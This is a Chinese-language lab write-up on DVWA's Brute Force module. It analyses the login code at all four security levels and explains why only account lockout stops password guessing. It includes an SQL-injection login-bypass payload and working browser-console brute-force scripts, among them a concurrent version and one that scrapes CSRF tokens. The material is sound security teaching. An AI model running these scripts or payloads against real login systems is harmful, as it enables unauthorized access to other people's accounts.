DVWA-Brute Force

- 定义

Brute Force（暴力破解）针对的是登录认证场景。攻击者通过反复尝试不同的用户名/密码组合，试图找出系统认可的那一组。

DVWA 这个模块的设计思路是：用同一个登录表单（username + password），让四级安全等级展示出不同的防御深度：

| 等级 | 核心防御 | 致命缺陷 |
|---|---|---|
| Low | 无 | 无任何过滤、无延迟、无锁定 |
| Medium | mysqli_real_escape_string | 仅防 SQL 注入，不防爆破；失败 sleep(2) 可被并发绕过 |
| High | CSRF token + 转义 + 随机延迟 | 随机延迟降低速度但不阻断；无锁定 |
| Impossible | PDO 预处理 + CSRF +账户锁定 | 真正阻断爆破 |

贯穿这一模块的关键判断：

SQL 注入防御 ≠ 爆破防御。前三级都在"防 SQL 注入"，但都没真正"防爆破"。只有 Impossible 才用"账户锁定 + 时间窗口"真正让爆破成本爆炸。这个区分点务必记住，是四级递进的主线。

- Low级

- 源码分析

- 回忆之前读过的源码，关键流程：

$user = $_GET['username'];

$pass = $_GET['password'];

$pass = md5($pass);  // 客户端传来的明文密码做一次 md5

$query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";

$result = mysqli_query($GLOBALS["___mysqli_ston"], $query);

然后根据 mysqli_num_rows($result) 是否为 0，输出 "Welcome" 或 "Login failed"。

- 漏洞分析（按维度拆解）

- 传输层缺陷：GET提交凭据

http://localhost/dvwa/vulnerabilities/brute/?username=admin&password=pwned&Login=Login

![](images/9-DVWA-Brute-Force-暴力破解/9-DVWA-Brute-Force-暴力破解_001.png)

凭据出现在 URL 里。后果：

- 浏览器历史、Web 服务器 access log、Referer 头、代理日志全都会留下明文密码

- 爆破工具直接发 GET 请求即可，构造 payload 极简单

正确做法：登录必须用 POST + HTTPS。

- 密码处理缺陷：客户端明文传输+服务端md5

- 注意——DVWA Low是客户端把明文密码塞进URL，到服务端再md5($pass)。

- ⚠️ 这里有个微妙的点需要理清楚：服务端存的是md5，但客户端传的是明文。所以攻击者爆破时直接传明文候选密码即可，不需要预计算md5。md5在这里对爆破速度没有任何阻碍。

正确做法：HTTPS传输+服务端用bcrypt/argon2等慢哈希算法存储。

- SQK构造缺陷：字符串拼接

$query = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";

直接拼接，没有任何转义、过滤、参数化。这同时带来两个漏洞：

- 可被SQL注入绕过认证

username：admin'#

password：anything

拼接后： SELECT * FROM 'users' WHERE user = 'admin'#' AND password = 'anyting';

# 注释掉后续条件，只要 admin 用户存在就直接登陆成功。这是认证绕过，比爆破更高效。

![](images/9-DVWA-Brute-Force-暴力破解/9-DVWA-Brute-Force-暴力破解_002.png)

我随便输入一串密码，但是因为admin'#直接注释掉了

- 可被爆破穷举

由于没有锁定机制、没有延迟、没有验证码、没有IP限流，攻击者可以无限制地提交候选凭据，直到命中。

- 认证逻辑缺陷：无任何"爆破阻力"

爆破的核心是速度，而 Low 级零阻力：

- 无失败次数限制

- 无账户锁定

- 无验证码

- 无失败延迟（sleep）

- 无 IP 限流

→ 每秒可发上百请求，常见密码字典几秒跑完。

- 实操

- 直接SQL注入秒过

打开 Brute Force 页面（左侧菜单 Brute Force），在表单中：

- Username: admin'#

- Password: x

- 点 Login

结果：
![](images/9-DVWA-Brute-Force-暴力破解/9-DVWA-Brute-Force-暴力破解_003.png)

观察 URL：

?username=admin'%23&password=x&Login=Login

%27%23 是 ' 和 # 的 URL 编码。

这就是 Low 级"既是 Brute Force 模块、又能用 SQL 注入秒过"的特点。模块名 ≠ 唯一攻击路径——这是 DVWA 的有意设计。

- 用字典爆破

既然模块叫 Brute Force，我们来真正跑一次字典爆破。思路和你做盲注时的 Console 脚本完全同构：

// 在 Brute Force 页面按 F12 打开 Console，粘贴执行

async function tryLogin(user, pass) {

const url = `/dvwa/vulnerabilities/brute/?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&Login=Login`;

const r = await fetch(url, { credentials: 'include' });

const t = await r.text();

return t.includes('Welcome to the password protected area');

}

async function brute(user, wordlist) {

for (const pass of wordlist) {

const ok = await tryLogin(user, pass);

console.log(`[${pass}] ${ok ? '✅' : '❌'}`);

if (ok) { console.log(`🎉 命中：${user} / ${pass}`); return pass; }

}

return null;

}
![](images/9-DVWA-Brute-Force-暴力破解/9-DVWA-Brute-Force-暴力破解_004.png)

// 一个最小字典（真正的字典如 rockyou.txt 有千万级条目）

const dict = ['123456','password','admin','admin123','12345678',

'qwerty','letmein','111111','password1','root',

'admin@123','P@ssw0rd','dvwa','welcome','pwned'];

brute('admin', dict);

注意：真实密码可能不在上面的字典里——但这正是真实场景：爆破依赖字典覆盖率，密码越冷门越难破。如果你要让脚本真正命中，可以先用 cmd5.com 反查一下那个 hash 看明文是什么，再验证爆破流程。

- 关键对比（SQL Injection vs Brute Force）

| 维度 | SQL Injection (Blind) | Brute Force |
|---|---|---|
| 目标 | 读取数据库内容 | 猜中凭据登录 |
| 攻击载体 | 注入 SQL 片段 | 提交候选 username/password |
| 成功信号 | 页面 exists/MISSING | 页面Username and/ or password incorrect. |
| 速度限制因素 | 字符 ASCII 范围 | 字典大小 + 服务端响应延迟 |
| 防御重心 | 参数化查询 | 账户锁定 + 慢哈希 + 限流 |

→ Low 级两者都成立：既能注入又能爆破。

- 用防御的视角去看

如果让你自己设计防御，针对 Low 级暴露的问题，最小有效防御组合应该是：

- 传输：POST + HTTPS（防窃听 + 防日志泄漏）

- SQL：PDO 预处理（防注入绕过）

- 存储：bcrypt/argon2（防 hash 库被脱后秒破）

- 爆破：失败次数 ≥ N 后锁定账户 T 分钟（防穷举）

- 可选：验证码 / IP 限流（增加自动化成本）

DVWA 的 Medium/High 只覆盖了 1（部分）、2（部分），完全没碰 4——这就是为什么 Medium 和 High 仍然能被爆破，只是慢一点而已。只有 Impossible 才真正实现了 4。

- Medium级

- 源码分析

相比 Low 级只多了两处改动：

$user = $_GET['username'];

$pass = $_GET['password'];

// 🆕 改动 1:对 user 和 pass 都做转义

$user = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $user);

$pass = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $pass);

$pass = md5($pass);

$query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";

$result = mysqli_query($GLOBALS["___mysqli_ston"], $query);

if (mysqli_num_rows($result) > 0) {

// Welcome...

} else {

// 🆕 改动 2:失败时 sleep(2)

sleep(2);

// Username and/or password incorrect.

}

就这两处,其它(GET 提交、md5、字符串拼接、无锁定)完全没变。

- 漏洞分析（按维度拆解）

改动1的作用范围：mysqli_real_escape_string防的是注入，不是爆破

这个函数的作用是转义SQL特殊字：' → \' 、 '' → \'' 、 \ → \\ 、 NUL等。

它防住了什么：

- Low 级我们用的 admin'# 注入,单引号会被转义成 \',无法闭合 SQL 字符串 → SQL 注入认证绕过路径被堵死。

- 这正是 Medium 相对 Low 的核心防御点。

它没防住什么：

- 爆破提交的是正常字符(admin / 123456),根本不含特殊字符 → 转义对爆破毫无影响。

- 攻击者照样可以遍历字典提交候选密码,服务端照常 md5 → 拼接 → 查询 → 返回结果。

💡 核心认知点：转义/参数化这类 SQL 防御机制,对爆破完全无效。爆破的"输入"是合法字符串,根本不触发转义逻辑。这就是为什么我前面说"SQL 注入防御 ≠ 爆破防御"——Medium 级是这句话的最佳例证。

改动2的作用与局限：sleep(2) 假设了攻击者是单线程

sleep(2) 的设计意图是:每次失败浪费 2 秒,让爆破变慢。

单线程下的效果(确实有效):

- 1000 个候选密码 → 失败 999 次 × 2 秒 ≈ 33 分钟

- 比起 Low 级的几秒跑完,慢了两个数量级

并发下的破绽(致命局限):

- sleep(2) 是在服务端单个请求的处理流程里执行的

- 如果攻击者同时发10个请求,这10个请求在服务端并行sleep,2秒后同时返回

- 相当于 10 倍速 → 1000 个密码只需 ~3.3 分钟

- 并发数提到 50 → 40 秒跑完

💡 sleep 防爆破的根本缺陷:它隐含了一个错误假设——"攻击者会乖乖地一个一个串行尝试"。真实世界的攻击者天然会用并发。任何依赖"单请求耗时"来拖慢爆破的方案,都能被并发绕过。

没改的部分：GET + md5 + 无锁定

凭据依然在 URL 里(GET 提交没变)

依然客户端传明文、服务端 md5

依然没有账户锁定、没有失败次数统计、没有时间窗口

→ 这意味着 Medium 级的"爆破阻力"本质上是 0——只是加了点"假阻力"。

- 实操

- SQL注入还能秒过吗？（验证转义的效果）

打开 Brute Force 页面,把 DVWA 安全等级切到 medium,然后试试 Low 级那个 admin'#：

Username: admin'#

Password: x

点 Login

结果：
![](images/9-DVWA-Brute-Force-暴力破解/9-DVWA-Brute-Force-暴力破解_005.png)

原因：' 被转义成 \',拼进 SQL 后变成:

SELECT * FROM `users` WHERE user = 'admin\'#' AND password = 'x';

\' 被当作字符串内的字符,字符串没有提前闭合,# 也失去了注释作用。

- 单线程爆破（慢，但是验证流程依旧可行）

直接复用 Low 级那个 brute() 脚本就能跑——fetch 是异步的,会自动等待服务端的 sleep(2) 返回。你会明显感觉到每个失败请求都要等 ~2 秒,字典跑完要十几分钟。

// 复用 Low 级脚本,无需改动

brute('admin', dict);

- 并发爆破（绕过sleep，这才是真实攻击）

核心思路:用多个 worker 同时发请求,让服务端的 sleep(2) 并行执行。

// 在 Brute Force 页面(medium 等级)Console 粘贴执行

async function tryLogin(user, pass) {

const url = `/dvwa/vulnerabilities/brute/?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&Login=Login`;

const r = await fetch(url, { credentials: 'include' });

const t = await r.text();

return t.includes('Welcome to the password protected area');

}

async function bruteConcurrent(user, wordlist, concurrency = 10) {

const queue = [...wordlist];

let found = false;   // 全局停机标志:命中后通知所有 worker 停止

async function worker(workerId) {

while (queue.length > 0 && !found) {

const pass = queue.shift();

if (pass === undefined) break;

const ok = await tryLogin(user, pass);

console.log(`[w${workerId}][${pass}] ${ok ? '✅' : '❌'}`);

if (ok) {

found = true;

console.log(`🎉 命中:${user} / ${pass}`);

return pass;

}

}

return null;

}

// 启动 concurrency 个 worker 并发跑

const workers = [];

for (let i = 0; i < concurrency; i++) workers.push(worker(i));

const results = await Promise.all(workers);

return results.find(r => r !== null);

}

bruteConcurrent('admin', dict, 10);

关键观察：

- 单线程(brute('admin', dict)):每 ~2 秒一个结果

- 并发 10(bruteConcurrent('admin', dict, 10)):每 ~2 秒一批 10 个结果

总耗时几乎只取决于 字典长度 / 并发数——sleep 的拖延效果被并发摊薄了。这就是 sleep 防爆破的根本失效点。

- 核心认知

Medium 级用 mysqli_real_escape_string 堵住了 SQL 注入,用 sleep(2) 试图拖慢爆破——但前者对爆破无效,后者被并发绕过。真正的爆破防御(账户锁定 + 时间窗口)依然完全缺位。

- 与 Low 级的对比表

| 维度 | Low | Medium | 变化 |
|---|---|---|---|
| 传输 | GET 明文 | GET 明文 | ❌ 无改进 |
| SQL 注入 | ❌ 可秒过(admin'#) | ✅ 转义阻断 | ✅ 改进 |
| 密码存储 | md5 | md5 | ❌ 无改进 |
| 爆破阻力 | 0 | sleep(2),可并发绕过 | ⚠️ 假阻力 |
| 账户锁定 | ❌ 无 | ❌ 无 | ❌ 无改进 |

→ Medium 级只完成了"防注入"这一半,完全没完成"防爆破"这一半。

- High级、

- 源码分析

相比 Medium 级又多了三处改动:

// 🆕 改动 1:CSRF token 校验

checkToken($_REQUEST['user_token'], $_SESSION['session_token'], 'index.php');

$user = $_GET['username'];

$pass = $_GET['password'];

// 🆕 改动 2:stripslashes + mysqli_real_escape_string 双重处理

$user = stripslashes($user);

$user = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $user);

$pass = stripslashes($pass);

$pass = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $pass);

$pass = md5($pass);

$query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";

$result = mysqli_query($GLOBALS["___mysqli_ston"], $query);

if (mysqli_num_rows($result) > 0) {

// Welcome...

} else {

// 🆕 改动 3:随机延迟 sleep(rand(0,3))

sleep(rand(0, 3));

// Username and/or password incorrect.

}

- 漏洞分析（按维度拆解）

改动1：CSRF token —— 挡的是CSRF，不是爆破

checkToken 做的事:校验请求里的 user_token 是否等于 session 里的 session_token,不等就跳回 index.php。

它防的是什么：

- 防 CSRF(跨站请求伪造)——攻击者诱导受害者在已登录状态下提交表单。

- 没有有效 token,请求直接被拒。

它对爆破的影响：

- 单次爆破请求必须携带有效 token 才能被处理,否则服务端直接跳转,根本到不了 SQL 查询逻辑。

- 这就要求爆破脚本必须先获取一次 token,才能发起请求。

- ⚠️ 但这是个一次性门槛,不是持续阻力——一旦脚本能自动获取 token,爆破流程和 Medium 级完全一样。

💡 关键认知:CSRF token 的设计目标是防 CSRF,不是防爆破。它能"挡住"爆破的本质是"你还得能拿到 token"——而拿到 token 这件事,对自动化脚本来说只是多写几行代码的事。它只是提高了攻击门槛,没有真正阻断爆破。

改动2：stripslashes + mysql_real_escape_string —— 防双重编码注入

stripslashes 的作用：撤销 PHP 的 magic quotes(已废弃)或 GPC 注入的 \。在 DVWA 的场景下,它和 mysqli_real_escape_string 组合起来,目的是防止攻击者通过"双写引号"或"双重编码"绕过转义。

它对爆破的影响：无。爆破提交的是正常字符,既不触发 stripslashes 的处理,也不触发转义逻辑。这层防御对爆破完全无效。

改动3：随机延迟 sleep(rand(0,3))——比Medium的固定sleep更狡猾

相比 Medium 级的 sleep(2),High 级用 sleep(rand(0,3))——每次失败随机等 0~3 秒。

它想解决什么：

避免固定 sleep(2) 被"测平均响应时间"识别(写脚本的人一眼就能看出"哦,失败就 sleep 2 秒,这是爆破防御")。

随机化让攻击者难以用单一的"响应时间阈值"判断是否命中——理论上,如果攻击者用"响应快=可能命中"作启发,随机 sleep 会引入噪声。

它的根本缺陷(和 Medium 一样):

依然是单请求耗时,依然假设攻击者串行。

并发依然能绕过：rand(0,3) 是每个请求独立采样,10 个并发请求各睡各的,平均还是 ~1.5 秒一批 10 个结果。

没有任何账户锁定、失败次数统计、时间窗口。

→ High 级的"爆破阻力"和 Medium 一样,本质是 0——只是把"假阻力"做得更花哨了。

- 实操

High 级的核心挑战:爆破脚本必须先拿到 CSRF token。我们分两步走:

- 观察token再页面里的位置

右键查看页面源代码或按F12检查表单，你会看到一个隐藏字段：

<input type="hidden" name="user_token" value="abc123def456...">

这个 value 就是 CSRF token。每次刷新页面,这个值会变。

![](images/9-DVWA-Brute-Force-暴力破解/9-DVWA-Brute-Force-暴力破解_006.png)

- 解析token提取思路

爆破脚本的工作流必须变成:

循环:

- GET /dvwa/vulnerabilities/brute/  ← 拿到页面 HTML

- 从 HTML 里正则提取 user_token 的 value

- 用这个 token + 候选密码发起登录请求

- 判断结果

- 完整的爆破脚本

// 在 Brute Force 页面(high 等级)Console 粘贴执行

async function getToken() {

const r = await fetch('/dvwa/vulnerabilities/brute/', { credentials: 'include' });

const html = await r.text();

const m = html.match(/name=['"]user_token['"]\s+value=['"]([a-f0-9]+)['"]/);

const token = m ? m[1] : null;

return token;

}

async function tryLogin(user, pass) {

const token = await getToken();           // 🆕 每次请求前先拿 token

const url = `/dvwa/vulnerabilities/brute/?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&user_token=${token}&Login=Login`;

const r = await fetch(url, { credentials: 'include' });

const t = await r.text();

return t.includes('Welcome to the password protected area');

}

async function brute(user, wordlist) {

for (const pass of wordlist) {

const ok = await tryLogin(user, pass);

console.log(`[${pass}] ${ok ? '✅' : '❌'}`);

if (ok) { console.log(`🎉 命中:${user} / ${pass}`); return pass; }

}

return null;

}

const dict = ['123456','password','admin','admin123','12345678',

'qwerty','letmein','111111','password1','root',

'admin@123','P@ssw0rd','dvwa','welcome','pwned'];

brute('admin', dict);

结果：
![](images/9-DVWA-Brute-Force-暴力破解/9-DVWA-Brute-Force-暴力破解_007.png)

- 进阶的并发爆破脚本

- 核心认知

High 级用 CSRF token 提高了门槛(必须先拿 token),用 sleep(rand(0,3)) 让延迟更难判断——但门槛只是"多写几行代码",延迟依然能被并发绕过。真正的爆破防御(账户锁定 + 时间窗口)依然完全缺位。

- 四级递进全景对比表

| 维度 | Low | Medium | High | Impossible |
|---|---|---|---|---|
| 传输 | GET 明文 | GET 明文 | GET 明文 | ✅ POST |
| SQL 注入防御 | ❌ 无 | mysqli_real_escape_string | + stripslashes | ✅ PDO 预处理 |
| 爆破阻力 | 0 | sleep(2) | rand(0,3) | ✅ 账户锁定 |
| 并发可绕过？ | — | ✅ 可 | ✅ 可 | ❌ 不可 |
| 账户锁定 | ❌ | ❌ | ❌ | ✅ 3 次失败锁 15 分钟 |
| CSRF 防御 | ❌ | ❌ | ✅ token | ✅ token +主动换 |
| 攻击成本 | 几秒 | 单线程慢,并发可绕 | 单线程慢,并发可绕 | 锁定后成本爆炸 |

→ High 级在"防注入"维度已经做得很到位(转义+stripslashes+token),但"防爆破"维度依然是 0。这是 DVWA 四级设计想传达的核心:爆破防御不能靠延迟,只能靠锁定。

- Impossible 级

- 源码分析

Impossible 级相比 High 级,改动很大。我按"防御维度"拆开讲,每个维度对爆破的实际影响都不同。

- 传输层:GET → POST

if( isset( $_POST[ 'Login' ] ) && isset ($_POST['username']) && isset ($_POST['password']) ) {

前三级都是 $_GET,Impossible 终于换成了 $_POST。凭据不再出现在 URL 里,不会被浏览器历史 / access log / Referer 泄漏。

对爆破的影响:

- 几乎为零。爆破工具发 POST 和发 GET 一样容易。

- 但这是"该做的事",属于基础卫生。

- SQL防御：PDO预处理

$data = $db->prepare( 'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );

$data->bindParam( ':user', $user, PDO::PARAM_STR);

$data->bindParam( ':password', $pass, PDO::PARAM_STR );

$data->execute();

前三级用 mysqli_real_escape_string + 字符串拼接,Impossible 换成了 PDO 预处理 + bindParam。

- 关键认知：PDO 预处理的本质是"代码与数据分离"——SQL 结构在 prepare() 时已经定型,用户输入作为参数传给已编译的 SQL 语句,不再被解释为 SQL 语法。这是防 SQL 注入的正解,不是转义那种"半吊子"防御。

- 对爆破的影响：无(爆破本来就不靠注入)。但这是 SQL 防御的"该做的事"。

- CSRF防御：保留token+ generateSessionToken()

checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

// ... 最后

generateSessionToken();  // 每次请求结束都重新生成 session token

和 High 级一样有 CSRF token,而且每次请求结束后调用 generateSessionToken() 主动换 token。

对爆破的影响:依然只是门槛,不是阻断。在 High 级已经验证过"每次 GET 拿最新 token 再发请求"能绕过它。

- ⭐ 核心新增:账户锁定机制(真正阻断爆破的关键)

这是 Impossible 级唯一的、真正的爆破防御。源码逻辑:

// 默认值

$total_failed_login = 3;   // 失败 3 次锁定

$lockout_time       = 15;  // 锁定 15 分钟

$account_locked     = false;

// 第一次查询:查该用户的失败次数和上次登录时间

$data = $db->prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' );

$data->bindParam( ':user', $user, PDO::PARAM_STR );

$data->execute();

$row = $data->fetch();

// 判断是否锁定

if( ( $data->rowCount() == 1 ) && ( $row[ 'failed_login' ] >= $total_failed_login ) ) {

$last_login = strtotime( $row[ 'last_login' ] );   // 上次登录时间戳

$timeout    = $last_login + ($lockout_time * 60);   // 锁定截止时间 = 上次登录 + 15 分钟

$timenow    = time();                                // 当前时间

if( $timenow < $timeout ) {                          // 还没过锁定窗口

$account_locked = true;                          // 标记为锁定

}

// 如果 $timenow >= $timeout,锁定窗口已过,允许重试

}

// 第二次查询:校验凭据(但即使凭据正确,锁定状态下也拒绝登录)

if( ( $data->rowCount() == 1 ) && ( $account_locked == false ) ) {

// ✅ 登录成功

// ...

// 重置失败计数

$data = $db->prepare( 'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;' );

} else {

// ❌ 登录失败

sleep( rand( 2, 4 ) );

// 失败次数 +1

$data = $db->prepare( 'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;' );

}

// 无论成功失败,更新 last_login

$data = $db->prepare( 'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;' );

- 账户锁定机制的工作流程图

![](images/9-DVWA-Brute-Force-暴力破解/9-DVWA-Brute-Force-暴力破解_008.png)

1）为什么这能真正阻断爆破?(关键认知)

前三级失败的根因:它们都在"单请求层面"做防御(转义、sleep、token),假设了攻击者会"乖乖地一个一个串行来"。

Impossible 的突破点:它把防御提升到了"账户状态 + 时间窗口"层面:

- 失败计数是持久化的(存在数据库 failed_login 字段里),不是请求级的临时变量

- 锁定判断基于真实时间(last_login + 15 分钟 vs time()),不是请求耗时

- 并发也无法绕过:假设 10 个并发请求同时到达,服务端会：

- 10 个请求都读到 failed_login = 2(第 3 次失败前的状态)

- 每个都判断"未锁定",进入凭据校验

- 都失败 → 每个都执行 failed_login + 1

- 但这 10 个并发请求可能基于"读到的旧值 +1",最终 failed_login 变成 3 而不是 12(取决于数据库并发控制)

- 一旦 failed_login 达到 3,后续所有请求都被锁定,无论并发多少

💡 核心认知:账户锁定防爆破的本质是——让攻击者的"尝试次数"变成稀缺资源。前三级攻击者可以无限试,Impossible 让你只能试 3 次,试完就锁 15 分钟。攻击者要在锁定窗口外才能继续,这把"每秒 100 次尝试"压缩成"每 15 分钟 3 次尝试"——速度下降 30000 倍。

2）数学验证:爆破成本爆炸

假设一个 8 位密码(大小写+数字+符号,约 6 万亿种组合):

| 等级 | 单次耗时 | 并发 | 每秒尝试 | 跑完所需时间 |
|---|---|---|---|---|
| Low | ~10ms | 10 | 1000 | ~190 年 |
| Medium | 2s | 50 | 25 | ~7600 年 |
| High | ~1.5s | 50 | 33 | ~5700 年 |
| Impossible | 2~4s + 锁定 | 无意义 | 3/15min = 0.0033 | ~5.7 万亿年 |

→ Impossible 让爆破时间从"几千年"变成"几万亿年"。这就是"账户锁定"的威力——它不是让爆破变慢,是让爆破在物理上不可能。

3）这个机制依然不是完美的(进阶思考)

- 用户枚举:源码注释里特意提到 // Note, using this method would allow for user enumeration!——攻击者可以通过"响应差异"判断用户名是否存在(失败 3 次后行为不同)。这是安全设计里的常见权衡。

- 锁定可被滥用(DoS):攻击者可以故意对某个账户疯狂提交错误密码,把它锁死,导致正常用户无法登录。这是账户锁定机制的固有副作用。

- 并发下的计数精度:多个并发请求基于"读到的旧值 +1",可能导致计数不精确(读到 2,+1 写回 3,而不是预期的 12)。但这不影响安全性——它只是让锁定"提前触发",对防御方有利。

- md5 依然是弱哈希:如果数据库被脱裤,md5 依然会被秒破。账户锁定只防在线爆破,不防离线爆破。

- 四级递进全景对比图（最终版）

| 维度 | Low | Medium | High | Impossible |
|---|---|---|---|---|
| 传输 | GET | GET | GET | ✅ POST |
| SQL 注入防御 | ❌ 无 | 转义 | 转义+stripslashes | ✅ PDO 预处理 |
| CSRF 防御 | ❌ | ❌ | ✅ token | ✅ token + 主动换 |
| 失败延迟 | ❌ | sleep(2) | rand(0,3) | rand(2,4) |
| 并发可绕过延迟? | — | ✅ 可 | ✅ 可 | ⚠️ 延迟可绕,但锁定不可 |
| 账户锁定 | ❌ | ❌ | ❌ | ✅ 3 次锁 15 分钟 |
| 爆破可行性 | 几秒 | 并发可绕 | 并发可绕 | ❌ 物理不可行 |

- 核心认知

Impossible 级用 PDO 预处理堵死了 SQL 注入,用 POST + token 做了基础卫生,但真正让爆破"物理不可行"的是账户锁定机制——把"尝试次数"从无限变成 3 次/15 分钟,让并发绕过失效。这才是爆破防御的正解。

- 总结

学完四级,现在应该能清晰回答这几个问题:

为什么前三级都防不住爆破? —— 因为它们都在"单请求层面"做防御,假设攻击者串行;没有把"尝试次数"变成稀缺资源。

Impossible 级的杀手锏是什么? —— 账户锁定 + 时间窗口,基于持久化状态和真实时间判断。

sleep 防爆破的根本缺陷是什么? —— 它假设单线程,并发能摊薄延迟。

CSRF token 防爆破吗? —— 不防,只是门槛。脚本能自动拿 token 就绕过了。

PDO 预处理防爆破吗? —— 不防,它防的是 SQL 注入。SQL 注入防御 ≠ 爆破防御——这句主线判断贯穿了整个模块。
